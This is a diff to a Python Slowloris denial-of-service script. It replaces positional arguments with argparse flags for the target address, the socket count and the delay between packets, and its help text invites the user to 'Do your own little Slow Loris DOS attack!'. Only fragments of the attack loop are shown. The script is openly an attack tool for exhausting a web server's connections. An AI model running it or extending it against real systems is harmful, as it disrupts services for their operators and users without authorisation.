@@ -3,6 +3,8 @@ import socket
 import random
 import time
 import sys
+import argparse
+
 
 
 def createsocket(ip):
@@ -18,14 +20,18 @@ def createsocket(ip):
     return s
 
 def main():
-    if len(sys.argv) != 3:
-        print("Usage : {} adress nbsockets".format(sys.argv[0]))
-        return
+    parser = argparse.ArgumentParser(description='Do your own little Slow Loris DOS attack!')
+    parser.add_argument('-a', action='store', dest='ip', help='target address', required=True)
+    parser.add_argument('-n', action='store', dest='nbsockets', type=int, help='number of sockets used', required=True)
+    parser.add_argument('-d', action='store', dest='delay', type=int, help='delay between packets, in seconds (default : 15)', default=15)
+
+    args = parser.parse_args()
 
     sockets = []
 
-    ip = sys.argv[1]
-    nbsockets=int(sys.argv[2])
+    ip = args.ip
+    nbsockets=args.nbsockets
+    delay = args.delay
 
     for _ in range(nbsockets):
         try:
@@ -50,7 +56,7 @@ def main():
                     sockets.append(sn)
             except socket.error:
                 break
-        time.sleep(15)
+        time.sleep(args.delay)
 
 
 if __name__ == "__main__":
